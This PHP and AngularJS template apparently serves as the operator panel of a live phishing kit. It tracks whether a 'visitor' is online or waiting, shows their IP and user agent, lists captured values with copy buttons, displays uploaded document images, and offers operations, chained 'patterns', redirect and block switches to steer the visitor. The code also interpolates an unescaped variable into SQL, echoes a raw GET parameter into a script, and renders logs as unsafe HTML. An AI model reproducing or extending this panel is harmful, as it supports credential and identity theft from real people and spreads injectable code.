<?php


if(!defined('UADMIN_AB_ROOT')){die("You not have permisions");}


//############# php vars ######################
//############# php vars ######################



$link_ops=$sql->query("select *  from opt where link='$link' limit 1")->fetchArray();


 ?>
<link href="<?php echo $k_plugin->url_ ?>css/oPanel.css" rel="stylesheet">
<script type="text/javascript" src="bower_components/clipboard/dist/clipboard.min.js"></script>
<script type="text/javascript" src="bower_components/ngclipboard/dist/ngclipboard.min.js"></script>

<div class="container-fluid mt-2">
    <nav aria-label="breadcrumb">
        <ol class="breadcrumb">
            <li class="breadcrumb-item"><a href="<?php echo $k_plugin->ajax_url ?>">Home</a></li>
            <li class="breadcrumb-item active" >O-panel for <?php echo $link ?></li>
        </ol>
    </nav>
</div>
<div class="container-fluid my-3" ng-app="op_app" ng-controller="main_controller" ng-cloak>
    <div class="text-center">
        <div class="alert alert-danger red_row text-center " ng-show="dynamic_data.visitor_online && dynamic_data.visitor_wating">
            <h2 class="inline m-0 ">
                <?php echo __('Visitor Waiting')?>
            </h2>
        </div>
        <div class="alert alert-success text-center " ng-show="dynamic_data.visitor_online && !dynamic_data.visitor_wating">
            <h2 class="inline m-0 ">
                <?php echo __('Visitor On-Line')?>
            </h2>
        </div>
        <div class="alert alert-secondary text-center " ng-show="!dynamic_data.visitor_online">
            <h2 class="inline m-0 text-dark">
                <?php echo __('Visitor Off-Line')?>
            </h2>
        </div>
    </div>


    <div class="row ">
        <div class="col-xl-1"></div>
        <div class="col-sm-7" >
            <h3>
                <?php echo __('Static information & Settings') ?>
            </h3>
            <div class="mb-3">
                <!-- Nav tabs -->
                <ul class="nav nav-tabs" id="Static-nav">
                    <li class="nav-item">
                        <a data-toggle="tab" href="#access" class="nav-link active">
                            <?php echo __('Browser & Access') ?>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a data-toggle="tab" href="#comm_tab" class="nav-link">
                            <?php echo ('Comment') ?>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="<?php echo $k_plugin->ajax_url.'&sub=jab_cog&ui='.$ui;?>">
                            <?php echo __('Jabber Settings') ?>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="<?php echo $k_plugin->ajax_url.'&sub=link_cog&ui='.$ui;?>">
                            <?php echo __('Op. Settings') ?>
                        </a>
                    </li>
                    <li class="nav-item ">
                        <a class="nav-link disabled" href="<?php echo $k_plugin->ajax_url.'&sub=link_cog&ui='.$ui;?>">
                            <?php echo __('Live-chat settings') ?>
                        </a>
                    </li>

                     <li class="nav-item ">
                        <a class="nav-link " href="<?php echo $k_plugin->ajax_url.'&sub=patterns&ui='.$ui;?>">
                             Op. Patterns &nbsp; <span class="fa fa-question-circle-o float-right" title="Help" data-toggle="popover" data-content="You can create patterns of operations which will trigger each after another automatically" ></span>
                        </a>
                    </li>
                </ul>
                <!-- Tab panes -->
                <div class="tab-content" class="static-tab-contnet">
                    <div class="tab-pane fade show active " id="access">
                        <div class="row " style="margin-top:10px">
                            <div class="col-sm-6">
                                <div class="card p-2">
                                    <dl>
                                        <dt>
                                            <?php echo __('User Agent') ?>
                                        </dt>
                                        <dd style="-webkit-user-select: all; ">{{dynamic_data.ua}}</dd>
                                        <dt >IP</dt>
                                        <dd  style="-webkit-user-select: all; ">{{dynamic_data.ip}}</dd>
                                    </dl>
                                </div>
                            </div>
                            <div class="col-sm-6">
                                <div class="card p-2" style="max-height: 150px;overflow: auto;">
                                    
                                    <table class=" w-100" style="">
                                      <div class="" ng-repeat="kyes in dynamic_data.keys   " >
                                           <span class=" text-capitalize text-secondary">{{kyes.k}}:</span>
                                           <b class="copy-item"  >{{kyes.v}}</b> <a href="javascript:void(0)">  <i  ngclipboard  data-clipboard-text="{{kyes.v}}"   class="fa fa-clipboard " title="divCopy" ngclipboard-success="onSuccess(e);" ></i> </a> 
                                      </div>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="tab-pane fade py-2" id="comm_tab">
                        <form action="" class="" method="post" name="" onsubmit="comm_update();return false">
                            <div class="input-group ">
                                <input class="form-control" id="comm" placeholder="Comment..." type="text" value="{{dynamic_data.comm}}">
                                <span class="input-group-append">
                                    <button class="btn btn-outline-info" type="submit">
                                        <?php echo __('Save') ?>
                                    </button>
                                </span>
                                </input>
                            </div>
                            <!-- /input-group -->
                        </form>
                    </div>
                </div>
            </div>
            <h3>Dynamic data & Live chat</h3>
            <!-- <div class="well "  ng-bind-html="dynamic_data.logs | replace_makros | unsafe " style="margin-top:0px;height:200px;overflow-y:auto;white-space: pre">
            </div> -->
            <ul class="nav nav-tabs">




                <li class="nav-item">
                    <a href="#logs" class="nav-link" data-ng-click="dynamic_active_tab='logs'" ng-class="{'active':dynamic_active_tab=='logs'}" data-toggle="tab">Logs <div class="badge  badge-warning">{{dynamic_data.logs.length}}</div></a>
                </li>



                <li class="nav-item">
                    <a href="#chat" ng-class="{'active':dynamic_active_tab=='chat'}" class="nav-link disabled" data-ng-click="dynamic_active_tab='chat'" data-toggle="tab">Live chat</a>
                </li>



                <li class="nav-item">
                    <a href="#files" ng-class="{'active':dynamic_active_tab=='files'}" class="nav-link " data-ng-click="dynamic_active_tab='files'" data-toggle="tab">Documents <div class="badge  badge-warning">{{dynamic_data.files.length}}</div></a>
                </li>
                <!--  <li ><a href="#messages"   data-toggle="tab">Messages</a></li>
    <li ><a href="#settings"   data-toggle="tab">Settings</a></li> -->
            </ul>
            <div class="tab-content">
               

                <div class="tab-pane " ng-class="{'active':dynamic_active_tab=='logs'}" id="logs">
                    <br>
                    <div class="card pt-2 " style="height:300px;overflow-y:auto;">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col"></div>
                                <div class="col-sm-4">
                                    <div class="form-group">
                                        <div class="input-group input-group-sm">
                                            <div class="input-group-prepend">
                                                <span class="input-group-text fa fa-search"></span>
                                            </div>
                                            <input type="text" placeholder="Search on logs..." class="form-control" name="log-search" id="log-search" ng-model="data.log_search">
                                            <span class="fa fa-times op-serch-clear" ng-if="data.log_search.length>0" ng-click="data.log_search=''"></span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="container-fluid">
                            <div class="alert alert-secondary p-1" data-ng-repeat="log in dynamic_data.logs | filter:data.log_search track by $index">
                                <span class="badge badge-info label33">{{log.time}}</span>
                                <div class="lo33" ng-bind-html="log.data | replace_makros | unsafe ">  </div>
                            </div>
                        </div>
                    </div>
                    <button class="btn btn-outline-info btn-block mt-2" onclick="clear_logs()">Clear logs</button>
                </div>




                <div class="tab-pane" ng-class="{'active':dynamic_active_tab=='chat'}" id="chat" chat>
                    <br>
                    {{dynamic_data.chat}}
                    <div class="">
                        <div class=""></div>
                    </div>
                    <hr>
                    <textarea name="suport_input" id="suport_input" cols="30" rows="3" class="form-control"></textarea>
                </div>
               



                <div class="tab-pane" ng-class="{'active':dynamic_active_tab=='files'}" id="files" files>
                     <br>   
                    <div class="card p-3">
                       
                            <div class="row">
                                <div class="col-4 col-sm-3" data-ng-repeat="file in dynamic_data.files">

                                    <a ng-href="{{file}}" target="__blank" class="card card-body" ><img ng-src="{{file}}" class="w-100" alt=""></a>
                                </div>
                            </div>

                    </div>
                </div>



            </div>
        </div>
        <div class="col">
            <h3 class="">Operations</h3>
            <div class="form-group op-serach ">
                <input type="text" class="form-control form-control-sm" name="op-serch" ng-model="search.title" id="op-serch" placeholder="Quick search operations...">
                <span class="fa fa-times op-serch-clear" ng-if="search.title.length>0" ng-click="search.title=''"></span>
            </div>
            <div class="scrop_operation">
                <!-- operation -->
                <div class="" ng-controller="opts-crtl">
                    <div class="card mb-2  border border-warning" ng-repeat="op in opts |filter:search  track by $index" op-dir>
                        <div class="card-header p-2">
                            {{op.title}}
                        </div>
                        <div class="card-body p-2 text-right">
                            <div class="form-group" ng-if="op.cn !==undefined">
                                <input type="text" class="form-control" name="cn" id="cn" ng-model="op.cn">
                            </div>
                            <div class="inputs" ng-repeat="input in op.inputs">
                                <div class="form-group">
                                    <label class="mb-0" for="input">{{input}}</label>
                                    <input type="text" class="form-control form-control-sm" placeholder="{{input}}" id="input" name="input" ng-model="op[input]">
                                </div>
                            </div>
                            <div class="">
                                <button class="btn btn-outline-warning btn-sm" ng-click="set_operations()">{{op.button}}</button>
                            </div>
                            <div class="">
                                <small>{{op.desc}}</small>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- operation -->
            </div>
            <div class="row">
                <div class="col-sm-6">
                    <div class="card  dir border border-warning" ng-init="

                                    op.als='<?php echo  __('Redirect')?>';
                                    op.title='<?php echo __('Redirect')?>';
                                    op.init_fn='redirect';
                                    op.sql_ms='Redirect activated';
                                    op.success_mes='<?php echo __('Visitor been Redirected')?>';
                                    op.return_prop='0'" re-dir="">
                        <div class="card-header">
                            {{op.title}}
                        </div>
                        <div class="card-body">
                           <div class="custom-control custom-switch"> 
                                 <input type="checkbox"  ng-model="dynamic_data.re"   ng-true-value="1" data-ng-change="set_operations()"  ng-false-value="0"    class="custom-control-input" id="redirectSwitch">
                                 <label class="custom-control-label" for="redirectSwitch">
                                     <span class="switchOnSpan text-success">ON</span>
                                     <span class="switchOffSpan text-danger">OFF</span>
                                 </label>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-sm-6">
                    <div bl-dir="" class="card  dir border border-warning" ng-init="

                                    op.als='<?php echo  __('Block')?>';
                                    op.title='<?php echo __('Block')?>';
                                    op.init_fn='block';
                                    op.sql_ms='Block activated';
                                    op.success_mes='<?php echo __('Visitor been Blocked')?>';
                                    op.return_prop='0'">
                        <div class="card-header">
                            {{op.title}}
                        </div>
                        <div class="card-body">
                            <!-- <input type="checkbox" class="bl_cl" ng-checked="dynamic_data.bl"> -->

                                
                            <div class="custom-control custom-switch"> 
                                 <input type="checkbox"  ng-model="dynamic_data.bl"   ng-true-value="1" data-ng-change="set_operations()"  ng-false-value="0"    class="custom-control-input" id="blockSwitch">
                                 <label class="custom-control-label" for="blockSwitch">
                                     <span class="switchOnSpan text-success">ON</span>
                                     <span class="switchOffSpan text-danger">OFF</span>
                                 </label>
                            </div>
                        </div>
                    </div>
                </div>
            </div>



            <!-- <div class="row">
                <div class="col-sm-6">
                    <div class="card bg-secondary text-dark dir border border-warning" ng-init="

                                    op.als='<?php echo  __('Redirect')?>';
                                    op.title='<?php echo __('Redirect')?>';
                                    op.init_fn='redirect';
                                    op.sql_ms='Redirect activated';
                                    op.success_mes='<?php echo __('Visitor been Redirected')?>';
                                    op.return_prop='0'" re-dir="">
                        <div class="card-header">
                            {{op.title}}
                        </div>
                        <div class="card-body">
                            <input type="checkbox" class="re_cl" ng-checked="dynamic_data.re">
                        </div>
                    </div>
                </div>
                <div class="col-sm-6">
                    <div bl-dir="" class="card bg-secondary text-dark dir border border-warning" ng-init="

                                    op.als='<?php echo  __('Block')?>';
                                    op.title='<?php echo __('Block')?>';
                                    op.init_fn='block';
                                    op.sql_ms='Block activated';
                                    op.success_mes='<?php echo __('Visitor been Blocked')?>';
                                    op.return_prop='0'">
                        <div class="card-header">
                            {{op.title}}
                        </div>
                        <div class="card-body">
                            <input type="checkbox" class="bl_cl" ng-checked="dynamic_data.bl">
                        </div>
                    </div>
                </div>
            </div> -->
        </div>
         <div class="col-xl-1"></div>
    </div>
</div>
<script type="text/javascript">
php_js.ui = <?php echo $_GET['ui'];?>;
php_js.opts = <?php echo ($link_ops['opt']) ?>;
</script>

<script type="text/javascript" src="<?php echo $k_plugin->url_; ?>js1/oPanel/oPanel.js"></script>
<script type="text/javascript" src="<?php echo $k_plugin->url_; ?>js1/oPanel/oPanel.ng.js"></script>